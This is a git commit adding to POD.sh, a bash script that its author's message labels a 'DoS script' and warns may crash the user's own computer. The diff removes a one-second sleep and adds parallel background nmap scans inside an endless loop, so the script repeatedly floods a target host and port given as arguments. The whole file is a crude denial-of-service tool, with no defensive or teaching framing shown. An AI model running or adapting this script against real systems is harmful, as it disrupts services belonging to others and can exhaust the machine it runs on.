379b9d87cd3ec25ef0247f0b5721e4f43250c035
Brett <Bmprobe@g.clemson.edu>
2019-04-24 19:42:10 -0400

    Temporary commit of DoS script. DO NOT USE THIS, IT WILL CRASH YOUR COMPUTER PROBABLY.

--- POD.sh
+++ POD.sh
@@ -1,5 +1,8 @@
 #!/bin/bash
 while true; do
   nmap -p $2 $1 > /dev/null &
-  sleep 1
+  nmap -p $2 $1 > /dev/null &
+  nmap -p $2 $1 > /dev/null &
+  nmap -p $2 $1 > /dev/null &
+  nmap -p $2 $1 > /dev/null &
 done
